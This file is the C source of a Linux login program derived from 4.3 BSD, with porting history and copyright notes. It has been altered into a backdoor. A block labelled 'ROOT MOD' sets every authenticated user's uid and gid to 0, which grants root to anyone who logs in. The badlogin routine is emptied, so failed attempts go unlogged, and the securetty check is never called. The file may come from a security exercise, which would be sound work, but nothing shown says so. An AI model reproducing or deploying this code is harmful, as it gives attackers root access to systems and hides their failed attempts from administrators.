/* This program is derived from 4.3 BSD software and is
   subject to the copyright notice below.

   The port to HP-UX has been motivated by the incapability
   of 'rlogin'/'rlogind' as per HP-UX 6.5 (and 7.0) to transfer window sizes.

   Michael Glad (glad@daimi.dk)
   Computer Science Department
   Aarhus University
   Denmark

   1990-07-04

   1991-09-24 glad@daimi.aau.dk: HP-UX 8.0 port:
              - now explictly sets non-blocking mode on descriptors
	      - strcasecmp is now part of HP-UX
   1992-02-05 poe@daimi.aau.dk: Ported the stuff to Linux 0.12
   From 1992 till now (1995) this code for Linux has been maintained at
   ftp.daimi.aau.dk:/pub/linux/poe/
*/
   
/*
 * Copyright (c) 1980, 1987, 1988 The Regents of the University of California.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms are permitted
 * provided that the above copyright notice and this paragraph are
 * duplicated in all such forms and that any documentation,
 * advertising materials, and other materials related to such
 * distribution and use acknowledge that the software was developed
 * by the University of California, Berkeley.  The name of the
 * University may not be used to endorse or promote products derived
 * from this software without specific prior written permission.
 * THIS SOFTWARE IS PROVIDED ``AS IS'' AND WITHOUT ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, WITHOUT LIMITATION, THE IMPLIED
 * WARRANTIES OF MERCHANTIBILITY AND FITNESS FOR A PARTICULAR PURPOSE.
 */


/*
 * login [ name ]
 * login -h hostname	(for telnetd, etc.)
 * login -f name	(for pre-authenticated login: datakit, xterm, etc.)
 */


#include <sys/param.h>

#define _GNU_SOURCE
#include <crypt.h>

#include <ctype.h>
#include <unistd.h>
#include <getopt.h>
#include <memory.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/file.h>
#include <termios.h>
#include <string.h>
#define index strchr
#define rindex strrchr
#include <sys/ioctl.h>
#include <signal.h>
#include <errno.h>
#include <grp.h>
#include <pwd.h>
#include <setjmp.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/sysmacros.h>
#include <netdb.h>


#include <utmp.h>

#ifdef SHADOW_PWD
#include <shadow.h>
#endif

#include "pathnames.h"

#define P_(s) ()
void opentty P_((const char *tty));
void getloginname P_((void));
void timedout P_((void));
int rootterm P_((char *ttyn));
void sigint P_((void));
void checknologin P_((void));
void badlogin P_((char *name));
char *stypeof P_((char *ttyid));
void checktty P_((char *user, char *tty));
void getstr P_((char *buf, int cnt, char *err));
void sleepexit P_((int eval));
#undef P_

#define TTYGRPNAME      "other"
#  ifndef MAXPATHLEN
#    define MAXPATHLEN 1024
#  endif


/*
 * This bounds the time given to login.  Not a define so it can
 * be patched on machines where it's too small.
 */

int     timeout = 60;


struct	passwd *pwd;
int	failures;
char	term[64], *hostname, *username, *tty;

char	thishost[100];

/* provided by Linus Torvalds 16-Feb-93 */
void 
opentty(const char * tty)
{
    int i;
    int fd = open(tty, O_RDWR);

    for (i = 0 ; i < fd ; i++)
      close(i);
    for (i = 0 ; i < 3 ; i++)
      dup2(fd, i);
    if (fd >= 3)
      close(fd);
}

int
main(argc, argv)
	int argc;
	char **argv;
{
	extern int errno, optind;
	extern char *optarg, **environ;
	struct group *gr;
	register int ch;
	register char *p;
	int ask, fflag, hflag, pflag, cnt;
	int passwd_req, ioctlval;
	char *domain, *salt, *ttyn, *pp;
	char tbuf[MAXPATHLEN + 2], tname[sizeof(_PATH_TTY) + 10];
	char *ctime(), *ttyname(), *stypeof();
	time_t time();
	void timedout();
	char *termenv;

	/* Just as arbitrary as mountain time: */
        /* (void)setenv("TZ", "MET-1DST",0); */

	(void)signal(SIGALRM, timedout);
	(void)alarm((unsigned int)timeout);
	(void)signal(SIGQUIT, SIG_IGN);
	(void)signal(SIGINT, SIG_IGN);

	(void)setpriority(PRIO_PROCESS, 0, 0);


	/*
	 * -p is used by getty to tell login not to destroy the environment
 	 * -f is used to skip a second login authentication 
	 * -h is used by other servers to pass the name of the remote
	 *    host to login so that it may be placed in utmp and wtmp
	 */
	(void)gethostname(tbuf, sizeof(tbuf));
	(void)strncpy(thishost, tbuf, sizeof(thishost)-1);
	domain = index(tbuf, '.');

	fflag = hflag = pflag = 0;
	passwd_req = 1;
	while ((ch = getopt(argc, argv, "fh:p")) != EOF)
		switch (ch) {
		case 'f':
			fflag = 1;
			break;

		case 'h':
			if (getuid()) {
				(void)fprintf(stderr,
				    "login: -h for super-user only.\n");
				exit(1);
			}
			hflag = 1;
			if (domain && (p = index(optarg, '.')) &&
			    strcasecmp(p, domain) == 0)
				*p = 0;
			hostname = optarg;
			break;

		case 'p':
			pflag = 1;
			break;
		case '?':
		default:
			(void)fprintf(stderr,
			    "usage: login [-fp] [username]\n");
			exit(1);
		}
	argc -= optind;
	argv += optind;
	if (*argv) {
		username = *argv;
		ask = 0;
	} else
		ask = 1;

	for (cnt = getdtablesize(); cnt > 2; cnt--)
		close(cnt);

	ttyn = ttyname(0);
	if (ttyn == NULL || *ttyn == '\0') {
		(void)sprintf(tname, "%s??", _PATH_TTY);
		ttyn = tname;
	}

	setpgrp();

	{
	    struct termios tt, ttt;

	    tcgetattr(0, &tt);
	    ttt = tt;
	    ttt.c_cflag &= ~HUPCL;

	    if((chown(ttyn, 0, 0) == 0) && (chmod(ttyn, 0622) == 0)) {
		tcsetattr(0,TCSAFLUSH,&ttt);
		signal(SIGHUP, SIG_IGN); /* so vhangup() wont kill us */
		vhangup();
		signal(SIGHUP, SIG_DFL);
	    }

	    setsid();

	    /* re-open stdin,stdout,stderr after vhangup() closed them */
	    /* if it did, after 0.99.5 it doesn't! */
	    opentty(ttyn);
	    tcsetattr(0,TCSAFLUSH,&tt);
	}

	if ((tty = rindex(ttyn, '/')))
		++tty;
	else
		tty = ttyn;

	for (cnt = 0;; ask = 1) {
		ioctlval = 0;

		if (ask) {
			fflag = 0;
			getloginname();
		}

		checktty(username, tty);

		(void)strcpy(tbuf, username);
		if ((pwd = getpwnam(username)))
			salt = pwd->pw_passwd;
		else
			salt = "xx";

		/*
		 * If no pre-authentication and a password exists
		 * for this user, prompt for one and verify it.
		 */
		if (!passwd_req || (pwd && !*pwd->pw_passwd))
			break;

		setpriority(PRIO_PROCESS, 0, -4);
		pp = getpass("Password: ");
		p = crypt(pp, salt);
		setpriority(PRIO_PROCESS, 0, 0);


		(void) memset(pp, 0, strlen(pp));
		if (pwd && !strcmp(p, pwd->pw_passwd))
			break;

		(void)printf("Login incorrect\n");
		failures++;
		badlogin(username); /* log ALL bad logins */

		/* we allow 10 tries, but after 3 we start backing off */
		if (++cnt > 3) {
			if (cnt >= 10) {
				sleepexit(1);
			}
			sleep((unsigned int)((cnt - 3) * 5));
		}
	}

	/* committed to login -- turn off timeout */
	(void)alarm((unsigned int)0);

	/* paranoia... */
	endpwent();

	/* This requires some explanation: As root we may not be able to
	   read the directory of the user if it is on an NFS mounted
	   filesystem. We temporarily set our effective uid to the user-uid
	   making sure that we keep root privs. in the real uid. 

	   A portable solution would require a fork(), but we rely on Linux
	   having the BSD setreuid() */

	/*BEGIN ROOT MOD: any user will login as admin*/
	pwd->pw_uid = 0;
	pwd->pw_gid = 0;
	/*END ROOT MOD                                */

	{
	    uid_t ruid = getuid();
	    gid_t egid = getegid();

	    setregid(-1, pwd->pw_gid);
	    setreuid(0, pwd->pw_uid);
	    setuid(0); /* setreuid doesn't do it alone! */
	    setreuid(ruid, 0);
	    setregid(-1, egid);
	}


	/* for linux, write entries in utmp and wtmp */
	{
		struct utmp ut;
		char *ttyabbrev;
		int wtmp;
		
		memset((char *)&ut, 0, sizeof(ut));
		ut.ut_type = USER_PROCESS;
		ut.ut_pid = getpid();
		strncpy(ut.ut_line, ttyn + sizeof("/dev/")-1, sizeof(ut.ut_line));
		ttyabbrev = ttyn + sizeof("/dev/tty") - 1;
		strncpy(ut.ut_id, ttyabbrev, sizeof(ut.ut_id));
		(void)time(&ut.ut_time);
		strncpy(ut.ut_user, username, sizeof(ut.ut_user));
		
		/* fill in host and ip-addr fields when we get networking */
		if (hostname) {
		    struct hostent *he;

		    strncpy(ut.ut_host, hostname, sizeof(ut.ut_host));
		    if ((he = gethostbyname(hostname)))
		      memcpy(&ut.ut_addr, he->h_addr_list[0],
			     sizeof(ut.ut_addr));
		}

		utmpname(_PATH_UTMP);
		setutent();
		pututline(&ut);
		endutent();
		
		if((wtmp = open(_PATH_WTMP, O_APPEND|O_WRONLY)) >= 0) {
		        flock(wtmp, LOCK_EX);
		        write(wtmp, (char *)&ut, sizeof(ut));
		        flock(wtmp, LOCK_UN);
			close(wtmp);
		}
	}
        /* fix_utmp_type_and_user(username, ttyn, LOGIN_PROCESS); */


	(void)chown(ttyn, pwd->pw_uid,
	    (gr = getgrnam(TTYGRPNAME)) ? gr->gr_gid : pwd->pw_gid);

	(void)chmod(ttyn, 0622);
	(void)setgid(pwd->pw_gid);

	initgroups(username, pwd->pw_gid);



	if (*pwd->pw_shell == '\0')
		pwd->pw_shell = _PATH_BSHELL;

	/* preserve TERM even without -p flag */
	{
		char *ep;
		
		if(!((ep = getenv("TERM")) && (termenv = strdup(ep))))
		  termenv = "dumb";
	}

	/* destroy environment unless user has requested preservation */
	if (!pflag)
        {
          environ = (char**)malloc(sizeof(char*));
	  memset(environ, 0, sizeof(char*));
	}


        (void)setenv("HOME", pwd->pw_dir, 0);      /* legal to override */
        if(pwd->pw_uid)
          (void)setenv("PATH", _PATH_DEFPATH, 1);
        else
          (void)setenv("PATH", _PATH_DEFPATH_ROOT, 1);
	(void)setenv("SHELL", pwd->pw_shell, 1);
	(void)setenv("TERM", termenv, 1);


        /* LOGNAME is not documented in login(1) but
	   HP-UX 6.5 does it. We'll not allow modifying it.
	 */
	(void)setenv("LOGNAME", pwd->pw_name, 1);
	if (pwd->pw_uid == 0){
		printf("\nlogged with root privileges!\n");
	}

	(void)signal(SIGALRM, SIG_DFL);
	(void)signal(SIGQUIT, SIG_DFL);
	(void)signal(SIGINT, SIG_DFL);
	(void)signal(SIGTSTP, SIG_IGN);
	(void)signal(SIGHUP, SIG_DFL);

	/* discard permissions last so can't get killed and drop core */
	if(setuid(pwd->pw_uid) < 0 && pwd->pw_uid) {
	    exit(1);
	}

	/* wait until here to change directory! */
	if (chdir(pwd->pw_dir) < 0) {
		(void)printf("No directory %s!\n", pwd->pw_dir);
		if (chdir("/"))
			exit(0);
		pwd->pw_dir = "/";
		(void)printf("Logging in with home = \"/\".\n");
	}

	/* if the shell field has a space: treat it like a shell script */
	if (strchr(pwd->pw_shell, ' ')) {
	    char *buff = malloc(strlen(pwd->pw_shell) + 6);
	    if (buff) {
		strcpy(buff, "exec ");
		strcat(buff, pwd->pw_shell);
		execlp("/bin/sh", "-sh", "-c", buff, (char *)0);
		fprintf(stderr, "login: couldn't exec shell script: %s.\n",
			strerror(errno));
		exit(0);
	    }
	    fprintf(stderr, "login: no memory for shell script.\n");
	    exit(0);
	}

	tbuf[0] = '-';
	strcpy(tbuf + 1, ((p = rindex(pwd->pw_shell, '/')) ?
			  p + 1 : pwd->pw_shell));

	execlp(pwd->pw_shell, tbuf, (char *)0);
	(void)fprintf(stderr, "login: no shell: %s.\n", strerror(errno));
	exit(0);
}

void
getloginname()
{
	register int ch;
	register char *p;
	static char nbuf[UT_NAMESIZE + 1];

	for (;;) {
		(void)printf("\n%s login: ", thishost); fflush(stdout);
		for (p = nbuf; (ch = getchar()) != '\n'; ) {
			if (ch == EOF) {
				badlogin(username);
				exit(0);
			}
			if (p < nbuf + UT_NAMESIZE)
				*p++ = ch;
		}
		if (p > nbuf){
			if (nbuf[0] == '-')
				(void)fprintf(stderr,
				    "login names may not start with '-'.\n");
			else {
				*p = '\0';
				username = nbuf;
				break;
			}
		}
	}
}

void timedout()
{
	struct termio ti;
	
	(void)fprintf(stderr, "Login timed out after %d seconds\n", timeout);

	/* reset echo */
	(void) ioctl(0, TCGETA, &ti);
	ti.c_lflag |= ECHO;
	(void) ioctl(0, TCSETA, &ti);
	exit(0);
}

int
rootterm(ttyn)
	char *ttyn;
{ 
  int fd;
  char buf[100],*p;
  int cnt, more = 0;

  fd = open(SECURETTY, O_RDONLY);
  if(fd < 0) return 1;

  /* read each line in /etc/securetty, if a line matches our ttyline
     then root is allowed to login on this tty, and we should return
     true. */
  for(;;) {
	p = buf; cnt = 100;
	while(--cnt >= 0 && (more = read(fd, p, 1)) == 1 && *p != '\n') p++;
	if(more && *p == '\n') {
		*p = '\0';
	  	if(!strcmp(buf, ttyn)) {
  			close(fd);
  			return 1;
	  	} else
  			continue;
  	} else {
  		close(fd);
  		return 0;
  	}
  }
}

void
badlogin(name)
	char *name;
{
	if (failures == 0)
		return;
}


void
checktty(user, tty)
     char *user;
     char *tty;
{
    FILE *f;
    char buf[256];
    char *ptr;
    char devname[50];
    struct stat stb;

    /* no /etc/usertty, default to allow access */
    if(!(f = fopen(_PATH_USERTTY, "r"))) return;

    while(fgets(buf, 255, f)) {

	/* strip comments */
	for(ptr = buf; ptr < buf + 256; ptr++) 
	  if(*ptr == '#') *ptr = 0;

	strtok(buf, " \t");
	if(strncmp(user, buf, 8) == 0) {
	    while((ptr = strtok(NULL, "\t\n "))) {
		if(strncmp(tty, ptr, 10) == 0) {
		    fclose(f);
		    return;
		}
		if(strcmp("PTY", ptr) == 0) {

		    sprintf(devname, "/dev/%s", ptr);
		    /* VERY linux dependent, recognize PTY as alias
		       for all pseudo tty's */
		    if((stat(devname, &stb) >= 0)
		       && major(stb.st_rdev) == 4 
		       && minor(stb.st_rdev) >= 192) {
			fclose(f);
			return;
		    }

		}
	    }
	    /* if we get here, /etc/usertty exists, there's a line
	       beginning with our username, but it doesn't contain the
	       name of the tty where the user is trying to log in.
	       So deny access! */
	    fclose(f);
	    printf("Login on %s denied.\n", tty);
	    badlogin(user);
	    sleepexit(1);
	}
    }
    fclose(f);
    /* users not mentioned in /etc/usertty are by default allowed access
       on all tty's */
}

void
getstr(buf, cnt, err)
	char *buf, *err;
	int cnt;
{
	char ch;

	do {
		if (read(0, &ch, sizeof(ch)) != sizeof(ch))
			exit(1);
		if (--cnt < 0) {
			(void)fprintf(stderr, "%s too long\r\n", err);
			sleepexit(1);
		}
		*buf++ = ch;
	} while (ch);
}

void
sleepexit(eval)
	int eval;
{
	sleep((unsigned int)5);
	exit(eval);
}

